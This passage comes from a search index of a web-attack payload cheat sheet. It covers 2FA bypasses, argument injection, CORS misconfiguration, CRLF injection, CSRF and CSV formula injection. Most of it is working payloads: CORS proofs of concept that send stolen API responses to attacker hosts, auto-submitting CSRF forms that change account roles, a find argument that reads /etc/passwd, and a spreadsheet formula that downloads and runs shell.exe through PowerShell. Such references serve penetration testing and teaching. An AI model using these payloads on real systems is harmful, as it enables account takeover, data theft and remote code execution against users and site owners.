<li>Create a payload for the CSRF, e.g: \"HTML form with auto submit for a password change\"</li> <li>Send the payload</li> </ol>"},{"location":"Account%20Takeover/#account-takeover-via-jwt","title":"Account Takeover via JWT","text":"<p>JSON Web Token might be used to authenticate an user. </p> <ul> <li>Edit the JWT with another User ID / Email</li> <li>Check for weak JWT signature </li> </ul>"},{"location":"Account%20Takeover/#2fa-bypasses","title":"2FA Bypasses","text":""},{"location":"Account%20Takeover/#response-manipulation","title":"Response Manipulation","text":"<p>In response if <code>\"success\":false</code> Change it to <code>\"success\":true</code></p>"},{"location":"Account%20Takeover/#status-code-manipulation","title":"Status Code Manipulation","text":"<p>If Status Code is 4xx Try to change it to 200 OK and see if it bypass restrictions</p>"},{"location":"Account%20Takeover/#2fa-code-leakage-in-response","title":"2FA Code Leakage in Response","text":"<p>Check the response of the 2FA Code Triggering Request to see if the code is leaked.</p>"},{"location":"Account%20Takeover/#js-file-analysis","title":"JS File Analysis","text":"<p>Rare but some JS Files may contain info about the 2FA Code, worth giving a shot</p>"},{"location":"Account%20Takeover/#2fa-code-reusability","title":"2FA Code Reusability","text":"<p>Same code can be reused</p>"},{"location":"Account%20Takeover/#lack-of-brute-force-protection","title":"Lack of Brute-Force Protection","text":"<p>Possible to brute-force any length 2FA Code</p>"},{"location":"Account%20Takeover/#missing-2fa-code-integrity-validation","title":"Missing 2FA Code Integrity Validation","text":"<p>Code for any user acc can be used to bypass the 2FA</p>"},{"location":"Account%20Takeover/#csrf-on-2fa-disabling","title":"CSRF on 2FA Disabling","text":"<p>No CSRF Protection on disabling 2FA, also there is no auth confirmation</p>"},{"location":"Account%20Takeover/#password-reset-disable-2fa","title":"Password Reset Disable 2FA","text":"<p>2FA gets disabled on password change/email change</p>"},{"location":"Account%20Takeover/#backup-code-abuse","title":"Backup Code Abuse","text":"<p>Bypassing 2FA by abusing the Backup code feature Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions</p>"},{"location":"Account%20Takeover/#clickjacking-on-2fa-disabling-page","title":"Clickjacking on 2FA Disabling Page","text":"<p>Iframing the 2FA Disabling page and social engineering victim to disable the 2FA</p>"},{"location":"Account%20Takeover/#enabling-2fa-doesnt-expire-previously-active-sessions","title":"Enabling 2FA doesn't expire Previously active Sessions","text":"<p>If the session is already hijacked and there is a session timeout vuln</p>"},{"location":"Account%20Takeover/#bypass-2fa-by-force-browsing","title":"Bypass 2FA by Force Browsing","text":"<p>If the application redirects to <code>/my-account</code> url upon login while 2Fa is disabled, try replacing <code>/2fa/verify</code> with <code>/my-account</code> while 2FA is enabled to bypass verification.</p>"},{"location":"Account%20Takeover/#bypass-2fa-with-null-or-000000","title":"Bypass 2FA with null or 000000","text":"<p>Enter the code 000000 or null to bypass 2FA protection.</p>"},{"location":"Account%20Takeover/#bypass-2fa-with-array","title":"Bypass 2FA with array","text":"<pre><code>{\n\"otp\":[\n\"1234\",\n\"1111\",\n\"1337\", // GOOD OTP\n\"2222\",\n\"3333\",\n\"4444\",\n\"5555\"\n]\n}\n</code></pre>"},{"location":"Account%20Takeover/#todo","title":"TODO","text":"<ul> <li>Broken cryptography</li> <li>Session hijacking</li> <li>OAuth misconfiguration</li> </ul>"},{"location":"Account%20Takeover/#references","title":"References","text":"<ul> <li>10 Password Reset Flaws - Anugrah SR</li> <li>$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato - Bug Bounty Reports Explained</li> <li>Broken Cryptography &amp; Account Takeovers - Harsh Bothra - September 20, 2020</li> <li>Hacking Grindr Accounts with Copy and Paste - Troy HUNT &amp; Wassime BOUIMADAGHENE - 03 OCTOBER 2020</li> <li>CTFd Account Takeover</li> <li>2FA simple bypass</li> </ul>"},{"location":"Argument%20Injection/","title":"Argument Injection","text":"<p>Argument injection is similar to command injection as tainted data is passed to to a command executed in a shell without proper sanitization/escaping.</p> <p>It can happen in different situations, where you can only inject arguments to a command:</p> <ul> <li>Improper sanitization (regex)</li> <li>Injection of arguments into a fixed command (PHP:escapeshellcmd, Python: Popen)</li> <li>Bash expansion (ex: *)</li> </ul> <p>In the following example, a python script takes the inputs from the command line to generate a <code>curl</code> command: <pre><code>from shlex import quote,split\nimport sys\nimport subprocess\nif __name__==\"__main__\":\ncommand = ['curl']\ncommand = command + split(sys.argv[1])\nprint(command)\nr = subprocess.Popen(command)\n</code></pre> It is possible for an attacker to pass several words to abuse options from <code>curl</code> command <pre><code>python python_rce.py \"https://www.google.fr -o test.py\" \n</code></pre> We can see by printing the command that all the parameters are splited allowing to inject an argument that will save the response in an arbitrary file. <pre><code>['curl', 'https://www.google.fr', '-o', 'test.py']\n</code></pre></p>"},{"location":"Argument%20Injection/#summary","title":"Summary","text":"<ul> <li>List of exposed commands</li> <li>CURL</li> <li>TAR</li> <li>FIND</li> <li>WGET</li> <li>References</li> </ul>"},{"location":"Argument%20Injection/#list-of-exposed-commands","title":"List of exposed commands","text":""},{"location":"Argument%20Injection/#curl","title":"CURL","text":"<p>It is possible to abuse <code>curl</code> through the following options:</p> <p><pre><code> -o, --output &lt;file&gt;        Write to file instead of stdout\n-O, --remote-name          Write output to a file named as the remote file\n</code></pre> In case there is already one option in the command it is possible to inject several URLs to download and several output options. Each option will affect each URL in sequence.</p>"},{"location":"Argument%20Injection/#tar","title":"TAR","text":"<p>For the <code>tar</code> command it is possible to inject arbitrary arguments in different commands. </p> <p>Argument injection can happen into the '''extract''' command: <pre><code>--to-command &lt;command&gt;\n--checkpoint=1 --checkpoint-action=exec=&lt;command&gt;\n-T &lt;file&gt; or --files-from &lt;file&gt;\n</code></pre></p> <p>Or in the '''create''' command: <pre><code>-I=&lt;program&gt; or -I &lt;program&gt;\n--use-compres-program=&lt;program&gt;\n</code></pre> There are also short options to work without spaces: <pre><code>-T&lt;file&gt;\n-I\"/path/to/exec\"\n</code></pre></p>"},{"location":"Argument%20Injection/#find","title":"FIND","text":"<p>Find some_file inside /tmp directory. <pre><code>$file = \"some_file\";\nsystem(\"find /tmp -iname \".escapeshellcmd($file));\n</code></pre></p> <p>Print /etc/passwd content. <pre><code>$file = \"sth -or -exec cat /etc/passwd ; -quit\";\nsystem(\"find /tmp -iname \".escapeshellcmd($file));\n</code></pre></p>"},{"location":"Argument%20Injection/#wget","title":"WGET","text":"<p>Example of vulnerable code <pre><code>system(escapeshellcmd('wget '.$url));\n</code></pre> Arbitrary file write <pre><code>$url = '--directory-prefix=/var/www/html http://example.com/example.php';\n</code></pre></p>"},{"location":"Argument%20Injection/#references","title":"References","text":"<ul> <li>staaldraad - Etienne Stalmans, November 24, 2019</li> <li>Back To The Future: Unix Wildcards Gone Wild - Leon Juranic, 06/25/2014</li> <li>TL;DR: How exploit/bypass/use PHP escapeshellarg/escapeshellcmd functions - kacperszurek,  Apr 25, 2018</li> </ul>"},{"location":"CORS%20Misconfiguration/","title":"CORS Misconfiguration","text":"<p>A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker\u2019s site using the victim\u2019s credentials. </p>"},{"location":"CORS%20Misconfiguration/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Prerequisites</li> <li>Exploitation</li> <li>References</li> </ul>"},{"location":"CORS%20Misconfiguration/#tools","title":"Tools","text":"<ul> <li>s0md3v/Corsy - CORS Misconfiguration Scanner</li> <li>chenjj/CORScanner - Fast CORS misconfiguration vulnerabilities scanner</li> <li>PostMessage POC Builder - @honoki</li> <li>trufflesecurity/of-cors - Exploit CORS misconfigurations on the internal networks </li> </ul>"},{"location":"CORS%20Misconfiguration/#prerequisites","title":"Prerequisites","text":"<ul> <li>BURP HEADER&gt; <code>Origin: https://evil.com</code></li> <li>VICTIM HEADER&gt; <code>Access-Control-Allow-Credential: true</code></li> <li>VICTIM HEADER&gt; <code>Access-Control-Allow-Origin: https://evil.com</code> OR <code>Access-Control-Allow-Origin: null</code></li> </ul>"},{"location":"CORS%20Misconfiguration/#exploitation","title":"Exploitation","text":"<p>Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target <code>https://victim.example.com/endpoint</code>.</p>"},{"location":"CORS%20Misconfiguration/#vulnerable-example-origin-reflection","title":"Vulnerable Example: Origin Reflection","text":""},{"location":"CORS%20Misconfiguration/#vulnerable-implementation","title":"Vulnerable Implementation","text":"<pre><code>GET /endpoint HTTP/1.1\nHost: victim.example.com\nOrigin: https://evil.com\nCookie: sessionid=... \nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true \n{\"[private API key]\"}\n</code></pre>"},{"location":"CORS%20Misconfiguration/#proof-of-concept","title":"Proof of concept","text":"<p>This PoC requires that the respective JS script is hosted at <code>evil.com</code></p> <pre><code>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://victim.example.com/endpoint',true); req.withCredentials = true;\nreq.send();\nfunction reqListener() {\nlocation='//atttacker.net/log?key='+this.responseText; };\n</code></pre> <p>or </p> <pre><code>&lt;html&gt;\n&lt;body&gt;\n&lt;h2&gt;CORS PoC&lt;/h2&gt;\n&lt;div id=\"demo\"&gt;\n&lt;button type=\"button\" onclick=\"cors()\"&gt;Exploit&lt;/button&gt;\n&lt;/div&gt;\n&lt;script&gt;\nfunction cors() {\nvar xhr = new XMLHttpRequest();\nxhr.onreadystatechange = function() {\nif (this.readyState == 4 &amp;&amp; this.status == 200) {\ndocument.getElementById(\"demo\").innerHTML = alert(this.responseText);\n}\n};\nxhr.open(\"GET\",\n\"https://victim.example.com/endpoint\", true);\nxhr.withCredentials = true;\nxhr.send();\n}\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"CORS%20Misconfiguration/#vulnerable-example-null-origin","title":"Vulnerable Example: Null Origin","text":""},{"location":"CORS%20Misconfiguration/#vulnerable-implementation_1","title":"Vulnerable Implementation","text":"<p>It's possible that the server does not reflect the complete <code>Origin</code> header but that the <code>null</code> origin is allowed. This would look like this in the server's response:</p> <pre><code>GET /endpoint HTTP/1.1\nHost: victim.example.com\nOrigin: null\nCookie: sessionid=... \n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n</code></pre>"},{"location":"CORS%20Misconfiguration/#proof-of-concept_1","title":"Proof of concept","text":"<p>This can be exploited by putting the attack code into an iframe using the data URI scheme. If the data URI scheme is used, the browser will use the <code>null</code> origin in the request:</p> <pre><code>&lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html, &lt;script&gt;\n  var req = new XMLHttpRequest();\n  req.onload = reqListener;\n  req.open('get','https://victim.example.com/endpoint',true);\n  req.withCredentials = true;\n  req.send();\n  function reqListener() {\n    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);\n   };\n&lt;/script&gt;\"&gt;&lt;/iframe&gt; \n</code></pre>"},{"location":"CORS%20Misconfiguration/#vulnerable-example-xss-on-trusted-origin","title":"Vulnerable Example: XSS on Trusted Origin","text":"<p>If the application does implement a strict whitelist of allowed origins, the exploit codes from above do not work. But if you have an XSS on a trusted origin, you can inject the exploit coded from above in order to exploit CORS again.</p> <pre><code>https://trusted-origin.example.com/?xss=&lt;script&gt;CORS-ATTACK-PAYLOAD&lt;/script&gt;\n</code></pre>"},{"location":"CORS%20Misconfiguration/#vulnerable-example-wildcard-origin-without-credentials","title":"Vulnerable Example: Wildcard Origin <code>*</code> without Credentials","text":"<p>If the server responds with a wildcard origin <code>*</code>, the browser does never send the cookies. However, if the server does not require authentication, it's still possible to access the data on the server. This can happen on internal servers that are not accessible from the Internet. The attacker's website can then  pivot into the internal network and access the server's data without authentication.</p> <pre><code>* is the only wildcard origin\nhttps://*.example.com is not valid\n</code></pre>"},{"location":"CORS%20Misconfiguration/#vulnerable-implementation_2","title":"Vulnerable Implementation","text":"<pre><code>GET /endpoint HTTP/1.1\nHost: api.internal.example.com\nOrigin: https://evil.com\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\n{\"[private API key]\"}\n</code></pre>"},{"location":"CORS%20Misconfiguration/#proof-of-concept_2","title":"Proof of concept","text":"<pre><code>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.internal.example.com/endpoint',true); req.send();\nfunction reqListener() {\nlocation='//atttacker.net/log?key='+this.responseText; };\n</code></pre>"},{"location":"CORS%20Misconfiguration/#vulnerable-example-expanding-the-origin-regex-issues","title":"Vulnerable Example: Expanding the Origin / Regex Issues","text":"<p>Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.</p>"},{"location":"CORS%20Misconfiguration/#vulnerable-implementation-example-1","title":"Vulnerable Implementation (Example 1)","text":"<p>In this scenario any prefix inserted in front of <code>example.com</code> will be accepted by the server. </p> <pre><code>GET /endpoint HTTP/1.1\nHost: api.example.com\nOrigin: https://evilexample.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evilexample.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n</code></pre>"},{"location":"CORS%20Misconfiguration/#proof-of-concept-example-1","title":"Proof of concept (Example 1)","text":"<p>This PoC requires the respective JS script to be hosted at <code>evilexample.com</code></p> <pre><code>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.example.com/endpoint',true); req.withCredentials = true;\nreq.send();\nfunction reqListener() {\nlocation='//atttacker.net/log?key='+this.responseText; };\n</code></pre>"},{"location":"CORS%20Misconfiguration/#vulnerable-implementation-example-2","title":"Vulnerable Implementation (Example 2)","text":"<p>In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: <code>^api.example.com$</code> instead of <code>^api\\.example.com$</code>. Thus, the dot can be replaced with any letter to gain access from a third-party domain.</p> <pre><code>GET /endpoint HTTP/1.1\nHost: api.example.com\nOrigin: https://apiiexample.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://apiiexample.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n</code></pre>"},{"location":"CORS%20Misconfiguration/#proof-of-concept-example-2","title":"Proof of concept (Example 2)","text":"<p>This PoC requires the respective JS script to be hosted at <code>apiiexample.com</code></p> <pre><code>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://api.example.com/endpoint',true); req.withCredentials = true;\nreq.send();\nfunction reqListener() {\nlocation='//atttacker.net/log?key='+this.responseText; };\n</code></pre>"},{"location":"CORS%20Misconfiguration/#labs","title":"Labs","text":"<ul> <li>CORS vulnerability with basic origin reflection</li> <li>CORS vulnerability with trusted null origin</li> <li>CORS vulnerability with trusted insecure protocols</li> <li>CORS vulnerability with internal network pivot attack</li> </ul>"},{"location":"CORS%20Misconfiguration/#bug-bounty-reports","title":"Bug Bounty reports","text":"<ul> <li>CORS Misconfiguration on www.zomato.com - James Kettle (albinowax)</li> <li>CORS misconfig | Account Takeover - niche.co - Rohan (nahoragg)</li> <li>Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy)</li> <li>CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t)</li> <li>[\u2588\u2588\u2588\u2588\u2588\u2588] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7)</li> </ul>"},{"location":"CORS%20Misconfiguration/#references","title":"References","text":"<ul> <li>Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019</li> <li>Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016</li> <li>Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016</li> <li>Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018</li> <li>PortSwigger Web Security Academy: CORS</li> <li>CORS Misconfigurations Explained - Detectify Blog</li> </ul>"},{"location":"CRLF%20Injection/","title":"Carriage Return Line Feed","text":"<p>The term CRLF refers to Carriage Return (ASCII 13, \\r) Line Feed (ASCII 10, \\n). They're used to note the termination of a line, however, dealt with differently in today\u2019s popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.</p> <p>A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.</p>"},{"location":"CRLF%20Injection/#summary","title":"Summary","text":"<ul> <li>CRLF - Add a cookie</li> <li>CRLF - Add a cookie - XSS Bypass</li> <li>CRLF - Write HTML</li> <li>CRLF - Filter Bypass</li> <li>References</li> </ul>"},{"location":"CRLF%20Injection/#crlf-add-a-cookie","title":"CRLF - Add a cookie","text":"<p>Requested page</p> <pre><code>http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue\n</code></pre> <p>HTTP Response</p> <pre><code>Connection: keep-alive\nContent-Length: 178\nContent-Type: text/html\nDate: Mon, 09 May 2016 14:47:29 GMT\nLocation: https://www.example.net/[INJECTION STARTS HERE]\nSet-Cookie: mycookie=myvalue\nX-Frame-Options: SAMEORIGIN\nX-Sucuri-ID: 15016\nx-content-type-options: nosniff\nx-xss-protection: 1; mode=block\n</code></pre>"},{"location":"CRLF%20Injection/#crlf-add-a-cookie-xss-bypass","title":"CRLF - Add a cookie - XSS Bypass","text":"<p>Requested page</p> <pre><code>http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2f%2e%2e\n</code></pre> <p>HTTP Response</p> <pre><code>HTTP/1.1 200 OK\nDate: Tue, 20 Dec 2016 14:34:03 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 22907\nConnection: close\nX-Frame-Options: SAMEORIGIN\nLast-Modified: Tue, 20 Dec 2016 11:50:50 GMT\nETag: \"842fe-597b-54415a5c97a80\"\nVary: Accept-Encoding\nX-UA-Compatible: IE=edge\nServer: NetDNA-cache/2.2\nLink: &lt;https://example.com/[INJECTION STARTS HERE]\nContent-Length:35\nX-XSS-Protection:0\n23\n&lt;svg onload=alert(document.domain)&gt;\n0\n</code></pre>"},{"location":"CRLF%20Injection/#crlf-write-html","title":"CRLF - Write HTML","text":"<p>Requested page</p> <pre><code>http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E\n</code></pre> <p>HTTP response</p> <pre><code>Set-Cookie:en\nContent-Length: 0\nHTTP/1.1 200 OK\nContent-Type: text/html\nLast-Modified: Mon, 27 Oct 2060 14:50:18 GMT\nContent-Length: 34\n&lt;html&gt;You have been Phished&lt;/html&gt;\n</code></pre>"},{"location":"CRLF%20Injection/#crlf-filter-bypass","title":"CRLF - Filter Bypass","text":"<p>Using UTF-8 encoding</p> <pre><code>%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE\n</code></pre> <p>Remainder:</p> <ul> <li>%E5%98%8A = %0A = \\u560a</li> <li>%E5%98%8D = %0D = \\u560d</li> <li>%E5%98%BE = %3E = \\u563e (&gt;)</li> <li>%E5%98%BC = %3C = \\u563c (&lt;)</li> </ul>"},{"location":"CRLF%20Injection/#labs","title":"Labs","text":"<ul> <li>https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection</li> </ul>"},{"location":"CRLF%20Injection/#exploitation-tricks","title":"Exploitation Tricks","text":"<ul> <li>Try to search for parameters that lead to redirects and fuzz them</li> <li>Also test the mobile version of the website, sometimes it is different or uses a different backend </li> </ul>"},{"location":"CRLF%20Injection/#references","title":"References","text":"<ul> <li>https://www.owasp.org/index.php/CRLF_Injection</li> <li>https://vulners.com/hackerone/H1:192749</li> </ul>"},{"location":"CSRF%20Injection/","title":"Cross-Site Request Forgery","text":"<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP</p>"},{"location":"CSRF%20Injection/#summary","title":"Summary","text":"<ul> <li>Methodology</li> <li>Payloads<ul> <li>HTML GET - Requiring User Interaction</li> <li>HTML GET - No User Interaction)</li> <li>HTML POST - Requiring User Interaction</li> <li>HTML POST - AutoSubmit - No User Interaction</li> <li>HTML POST - multipart/form-data with file upload - Requiring User Interaction</li> <li>JSON GET - Simple Request</li> <li>JSON POST - Simple Request</li> <li>JSON POST - Complex Request</li> </ul> </li> <li>Bypass referer header validation check<ul> <li>Basic payload</li> <li>With question mark payload</li> <li>With semicolon payload</li> <li>With subdomain payload</li> </ul> </li> <li>References</li> </ul>"},{"location":"CSRF%20Injection/#tools","title":"Tools","text":"<ul> <li>XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.</li> </ul>"},{"location":"CSRF%20Injection/#methodology","title":"Methodology","text":""},{"location":"CSRF%20Injection/#payloads","title":"Payloads","text":"<p>When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.</p>"},{"location":"CSRF%20Injection/#html-get-requiring-user-interaction","title":"HTML GET - Requiring User Interaction","text":"<pre><code>&lt;a href=\"http://www.example.com/api/setusername?username=CSRFd\"&gt;Click Me&lt;/a&gt;\n</code></pre>"},{"location":"CSRF%20Injection/#html-get-no-user-interaction","title":"HTML GET - No User Interaction","text":"<pre><code>&lt;img src=\"http://www.example.com/api/setusername?username=CSRFd\"&gt;\n</code></pre>"},{"location":"CSRF%20Injection/#html-post-requiring-user-interaction","title":"HTML POST - Requiring User Interaction","text":"<pre><code>&lt;form action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\"&gt;\n&lt;input name=\"username\" type=\"hidden\" value=\"CSRFd\" /&gt;\n&lt;input type=\"submit\" value=\"Submit Request\" /&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"CSRF%20Injection/#html-post-autosubmit-no-user-interaction","title":"HTML POST - AutoSubmit - No User Interaction","text":"<pre><code>&lt;form id=\"autosubmit\" action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\"&gt;\n&lt;input name=\"username\" type=\"hidden\" value=\"CSRFd\" /&gt;\n&lt;input type=\"submit\" value=\"Submit Request\" /&gt;\n&lt;/form&gt;\n&lt;script&gt;\ndocument.getElementById(\"autosubmit\").submit();\n&lt;/script&gt;\n</code></pre>"},{"location":"CSRF%20Injection/#html-post-multipartform-data-with-file-upload-requiring-user-interaction","title":"HTML POST - multipart/form-data with file upload - Requiring User Interaction","text":"<pre><code>&lt;script&gt;\nfunction launch(){\nconst dT = new DataTransfer();\nconst file = new File( [ \"CSRF-filecontent\" ], \"CSRF-filename\" );\ndT.items.add( file );\ndocument.xss[0].files = dT.files;\ndocument.xss.submit()\n}\n&lt;/script&gt;\n&lt;form style=\"display: none\" name=\"xss\" method=\"post\" action=\"&lt;target&gt;\" enctype=\"multipart/form-data\"&gt;\n&lt;input id=\"file\" type=\"file\" name=\"file\"/&gt;\n&lt;input type=\"submit\" name=\"\" value=\"\" size=\"0\" /&gt;\n&lt;/form&gt;\n&lt;button value=\"button\" onclick=\"launch()\"&gt;Submit Request&lt;/button&gt;\n</code></pre>"},{"location":"CSRF%20Injection/#json-get-simple-request","title":"JSON GET - Simple Request","text":"<pre><code>&lt;script&gt;\nvar xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"http://www.example.com/api/currentuser\");\nxhr.send();\n&lt;/script&gt;\n</code></pre>"},{"location":"CSRF%20Injection/#json-post-simple-request","title":"JSON POST - Simple Request","text":"<pre><code>&lt;script&gt;\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"http://www.example.com/api/setrole\");\n//application/json is not allowed in a simple request. text/plain is the default\nxhr.setRequestHeader(\"Content-Type\", \"text/plain\");\n//You will probably want to also try one or both of these\n//xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n//xhr.setRequestHeader(\"Content-Type\", \"multipart/form-data\");\nxhr.send('{\"role\":admin}');\n&lt;/script&gt;\n</code></pre>"},{"location":"CSRF%20Injection/#json-post-complex-request","title":"JSON POST - Complex Request","text":"<pre><code>&lt;script&gt;\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"http://www.example.com/api/setrole\");\nxhr.withCredentials = true;\nxhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");\nxhr.send('{\"role\":admin}');\n&lt;/script&gt;\n</code></pre>"},{"location":"CSRF%20Injection/#bypass-referer-header-validation","title":"Bypass referer header validation","text":""},{"location":"CSRF%20Injection/#basic-payload","title":"Basic payload","text":"<pre><code>1) Open https://attacker.com/csrf.html\n2) Referer header is ..\n\nReferer: https://attacker.com/csrf.html\n</code></pre>"},{"location":"CSRF%20Injection/#with-question-mark-payload","title":"With question mark(<code>?</code>) payload","text":"<pre><code>1) Open https://attacker.com/csrf.html?trusted.domain.com\n2) Referer header is ..\n\nReferer: https://attacker.com/csrf.html?trusted.domain.com\n</code></pre>"},{"location":"CSRF%20Injection/#with-semicolon-payload","title":"With semicolon(<code>;</code>) payload","text":"<pre><code>1) Open https://attacker.com/csrf.html;trusted.domain.com\n2) Referer header is ..\n\nReferer: https://attacker.com/csrf.html;trusted.domain.com\n</code></pre>"},{"location":"CSRF%20Injection/#with-subdomain-payload","title":"With subdomain payload","text":"<pre><code>1) Open https://trusted.domain.com.attacker.com/csrf.html\n2) Referer headers is ..\n\nReferer: https://trusted.domain.com.attacker.com/csrf.html\n</code></pre>"},{"location":"CSRF%20Injection/#labs","title":"Labs","text":"<ul> <li>CSRF vulnerability with no defenses</li> <li>CSRF where token validation depends on request method</li> <li>CSRF where token validation depends on token being present</li> <li>CSRF where token is not tied to user session</li> <li>CSRF where token is tied to non-session cookie</li> <li>CSRF where token is duplicated in cookie</li> <li>CSRF where Referer validation depends on header being present</li> <li>CSRF with broken Referer validation</li> </ul>"},{"location":"CSRF%20Injection/#references","title":"References","text":"<ul> <li>Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016</li> <li>Cross-Site Request Forgery (CSRF) - OWASP</li> <li>Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton </li> <li>Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial</li> <li>Hacking PayPal Accounts with one click (Patched) - Yasser Ali</li> <li>Add tweet to collection CSRF - vijay kumar</li> <li>Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd</li> <li>How i Hacked your Beats account ? Apple Bug Bounty - @aaditya_purani</li> <li>FORM POST JSON: JSON CSRF on POST Heartbeats API - Dr.Jones</li> <li>Hacking Facebook accounts using CSRF in Oculus-Facebook integration</li> <li>Cross site request forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019</li> <li>Cross-Site Request Forgery Attack - PwnFunction</li> <li>Wiping Out CSRF - Joe Rozner - Oct 17, 2017</li> <li>Bypass referer check logic for CSRF</li> </ul>"},{"location":"CSV%20Injection/","title":"CSV Injection","text":"<p>Many web applications allow the user to download content such as templates for invoices or user settings to a CSV file. Many users choose to open the CSV file in either Excel, Libre Office or Open Office. When a web application does not properly validate the contents of the CSV file, it could lead to contents of a cell or many cells being executed.</p>"},{"location":"CSV%20Injection/#exploit","title":"Exploit","text":"<p>Basic exploit with Dynamic Data Exchange</p> <pre><code># pop a calc\nDDE (\"cmd\";\"/C calc\";\"!A0\")A0\n@SUM(1+1)*cmd|' /C calc'!A0\n=2+5+cmd|' /C calc'!A0\n# pop a notepad\n=cmd|' /C notepad'!'A1'\n# powershell download and execute\n=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0\n# msf smb delivery with rundll32\n=cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1\n# Prefix obfuscation and command chaining\n=AAAA+BBBB-CCCC&amp;\"Hello\"/12345&amp;cmd|'/c calc.exe'!A\n=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A\n+thespanishinquisition(cmd|'/c calc.exe'!A\n=         cmd|'/c calc.exe'!A\n# Using rundll32 instead of cmd\n=rundll32|'URL.dll,OpenURL calc.exe'!A\n=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A\n# Using null characters to bypass dictionary filters. Since they are not spaces, they are ignored when executed.\n=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A\n</code></pre> <p>Technical Details of the above payload:</p> <ul> <li><code>cmd</code> is the name the server can respond to whenever a client is trying to access the server</li> <li><code>/C</code> calc is the file name which in our case is the calc(i.e the calc.exe)</li> <li><code>!A0</code> is the item name that specifies unit of data that a server can respond when the client is requesting the data</li> </ul> <p>Any formula can be started with</p> <pre><code>=\n+\n\u2013\n@\n</code></pre>"},{"location":"CSV%20Injection/#references","title":"References","text":"<ul> <li>OWASP - CSV Excel Macro Injection</li> <li>Google Bug Hunter University - CSV Excel formula injection</li> <li>CSV INJECTION: BASIC TO EXPLOIT!!!! - 30/11/2017 - Akansha Kesharwani</li> <li>From CSV to Meterpreter - 5th November 2015 - Adam Chester</li> <li>The Absurdly Underestimated Dangers of CSV Injection - 7 October, 2017 - George 